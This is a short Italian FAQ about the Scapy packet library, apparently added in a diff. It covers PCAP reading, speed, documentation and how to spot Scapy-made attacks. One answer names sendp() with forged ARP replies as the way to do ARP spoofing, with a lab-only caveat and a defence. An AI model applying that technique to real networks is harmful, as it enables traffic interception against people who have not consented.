+**Come leggo un file PCAP con Scapy?** Con `rdpcap("file.pcap")` per caricarlo tutto, oppure con `PcapReader` per leggerlo un pacchetto alla volta.
+
+**Scapy è lento?** Sì, rispetto a Nmap o masscan. È scritto in Python e costruisce ogni pacchetto da zero. Per scansioni grandi usa Nmap, per casi particolari usa Scapy.
+
+**Scapy fa ARP spoofing?** Sì, mandando risposte ARP false con `sendp()`. Va fatto solo in laboratorio, e si previene con Dynamic ARP Inspection.
+
+**Dov'è la documentazione di Scapy?** La documentazione ufficiale è su scapy.readthedocs.io. Dentro la shell, `ls()` e `lsc()` elencano protocolli e funzioni.
+
+**Come mi accorgo di un attacco fatto con Scapy?** Dai segnali sulla rete, non dal programma: cambi di MAC per lo stesso IP, molti SYN in pochi secondi, flag TCP impossibili, frammenti strani. Un monitor ARP e un IDS li vedono.
